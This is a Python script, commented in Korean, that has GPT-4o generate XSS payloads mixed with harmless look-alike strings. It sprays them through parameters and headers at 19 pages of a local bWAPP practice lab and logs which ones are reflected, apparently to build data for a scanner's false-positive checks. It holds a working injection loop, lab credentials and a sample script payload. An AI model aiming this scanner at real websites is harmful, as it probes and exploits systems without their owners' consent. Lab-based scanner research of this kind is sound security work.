import requests
import csv
import os
from openai import OpenAI
from dotenv import load_dotenv

# 1. .env 파일 로드 (같은 폴더에 있는 .env 파일을 읽어옴)
load_dotenv()

# 2. 환경 변수에서 API 키 가져오기
api_key = os.getenv("OPENAI_API_KEY")

if not api_key:
    print("error: APIKEY 환경 변수가 설정되지 않았습니다. .env 파일을 확인하세요.")
    exit()

# 3. 클라이언트 객체 생성 시 로드한 키 사용
client = OpenAI(api_key=api_key)

def generate_ai_payloads(count=100):
    """OpenAI API를 호출하여 XSS 공격 페이로드와 오탐 유도용 정상 코드를 혼합 생성"""
    print(f"\nAI에게 {count}개의 테스트 페이로드(진짜 공격 + 오탐 유도용) 생성을 요청 중...")
    try:
        response = client.chat.completions.create(
            model="gpt-4o",
            messages=[
                {"role": "system", "content": "너는 웹 취약점 진단 도구 및 AI 오탐(False Positive) 판독기를 테스트하기 위한 데이터 생성기야."},
                {"role": "user", "content": f"""
bWAPP XSS 실습 환경에 입력할 테스트 페이로드 {count}개를 만들어줘.
아래 두 가지 유형을 절반씩 무작위로 섞어서 작성해:

[유형 1: 실제 악의적인 XSS 공격 페이로드]
- <script>, <iframe>, <svg>, onerror, javascript: 등을 활용한 실제 실행 가능한 스크립트.

[유형 2: 오탐(False Positive)을 유발하는 무해한 정상 코드 및 텍스트]
- 특수문자(<, >, ', ")가 포함되어 있어 스캐너는 의심할 수 있지만, 실제 악성 스크립트는 아닌 것.
- 예: <b>단순 강조 텍스트</b>, 5 < 10 (수식), "인용구", 하트 이모티콘 <3, 단순 텍스트 등.

절대 부가 설명이나 번호 매기기를 하지 말고, 오직 페이로드만 한 줄에 하나씩 순수 텍스트로 출력해.
"""}
            ],
            temperature=0.8,
            max_tokens=2500 # 100개가 잘리지 않도록 토큰 제한 확장
        )
        
        raw_text = response.choices[0].message.content.strip()
        ai_payloads = [p.strip() for p in raw_text.split('\n') if p.strip()]
        
        print(f"AI 페이로드 생성 완료! (총 {len(ai_payloads)}개 추출됨)")
        return ai_payloads
    
    except Exception as e:
        print(f"AI 호출 에러: {e}")
        return ["<script>alert(1)</script>", "<b>정상코드</b>"]

# ==========================================
# 1. 세션 객체 생성 (세션 쿠키 유지)
# ==========================================
session = requests.Session()

target_host = "http://192.168.199.130"
login_url = f"{target_host}/bWAPP/login.php"

# 스캔할 타겟 URL 리스트
target_urls = [
    f"{target_host}/bWAPP/xss_get.php",
    f"{target_host}/bWAPP/xss_post.php",
    f"{target_host}/bWAPP/xss_json.php",
    f"{target_host}/bWAPP/xss_ajax_2-1.php",
    f"{target_host}/bWAPP/xss_ajax_1-1.php",
    f"{target_host}/bWAPP/xss_back_button.php",
    f"{target_host}/bWAPP/xss_custom_header.php",
    f"{target_host}/bWAPP/xss_href-1.php",
    f"{target_host}/bWAPP/xss_eval.php?date=Date()",
    f"{target_host}/bWAPP/xss_login.php",
    f"{target_host}/bWAPP/xss_phpmyadmin.php",
    f"{target_host}/bWAPP/xss_php_self.php",
    f"{target_host}/bWAPP/xss_referer.php",
    f"{target_host}/bWAPP/xss_user_agent.php",
    f"{target_host}/bWAPP/xss_stored_1.php",
    f"{target_host}/bWAPP/xss_stored_3.php",
    f"{target_host}/bWAPP/xss_stored_2.php",
    f"{target_host}/bWAPP/xss_sqlitemanager.php",
    f"{target_host}/bWAPP/xss_stored_4.php"
]

print("="*50)
print("🚀 [다중 URL] 지능형 XSS 스캐너 작동 시작")
print("="*50)

# 2. bWAPP 로그인
print(f"\n[1단계] 로그인 시도 중... (URL: {login_url})")
login_data = {"login": "bee", "password": "bug", "security_level": "0", "form": "submit"}

try:
    login_resp = session.post(login_url, data=login_data)
    if "portal.php" in login_resp.url or "Welcome" in login_resp.text:
        print(f"로그인 성공!")
    else:
        print(f"로그인 실패 가능성 있음.")
except Exception as e:
    print(f"에러: {e}")
    exit()

# ==========================================
# 3. AI 페이로드 동적 생성
# ==========================================
payloads = generate_ai_payloads(100) 

results = []
print(f"\n[2단계] 다중 URL 공격 스캔 시작... (타겟: {len(target_urls)}개)")

# 4. URL 및 페이로드 반복 전송 (이중 루프)
for url_idx, url in enumerate(target_urls, 1):
    print(f"\n[{url_idx}/{len(target_urls)}] 타겟 스캔 중: {url}")
    
    for i, payload in enumerate(payloads, 1):
        # [범용 인젝션] GET, POST, Stored 등에 자주 쓰이는 파라미터 이름을 모두 포함
        attack_params = {
            "firstname": payload, "lastname": payload, 
            "title": payload, "entry": payload, "blog": payload,
            "login": payload, "password": payload, 
            "date": payload, "action": "add", "form": "submit"
        }
        
        # [헤더 인젝션] User-Agent, Referer 취약점을 노리기 위한 헤더 조작
        attack_headers = {
            "User-Agent": payload,
            "Referer": payload,
            "bWAPP": payload # Custom Header 취약점용
        }
        
        try:
            # 1. GET 방식 전송 (파라미터와 헤더 모두 포함)
            res_get = session.get(url, params=attack_params, headers=attack_headers, timeout=5)
            # 2. POST 방식 전송 (데이터 바디와 헤더 모두 포함)
            res_post = session.post(url, data=attack_params, headers=attack_headers, timeout=5)
            
            # GET이나 POST 응답 중 하나라도 페이로드가 원형 반사되었다면 취약으로 간주
            if payload in res_get.text or payload in res_post.text:
                is_reflected = "Yes"
                # 반사된 쪽의 텍스트를 저장
                snippet = (res_get.text if payload in res_get.text else res_post.text)[:200]
            else:
                is_reflected = "No (Filtered)"
                snippet = res_get.text[:200]
            
            # 터미널 출력은 너무 길어지지 않게 10번 단위로만 출력
            if i % 10 == 0 or is_reflected == "Yes":
                print(f"   ㄴ [Test {i}/{len(payloads)}] 반사 여부: {is_reflected} (페이로드: {payload[:20]}...)")
            
            results.append({
                "target_url": url,
                "payload": payload,
                "is_reflected": is_reflected,
                "response_snippet": snippet 
            })
            
        except Exception as e:
            pass # 타임아웃 등의 에러는 스킵

# 저장 경로 설정 및 디렉토리 확인/생성
output_dir = os.path.join("data", "raw")
os.makedirs(output_dir, exist_ok=True)

csv_filename = os.path.join(output_dir, "raw-findings-xss-multi.csv")

with open(csv_filename, "w", encoding="utf-8", newline="") as f:
    # 컬럼에 target_url 추가
    writer = csv.DictWriter(f, fieldnames=["target_url", "payload", "is_reflected", "response_snippet"])
    writer.writeheader()
    writer.writerows(results)

print(f"[Info] CSV 저장 완료: '{csv_filename}'")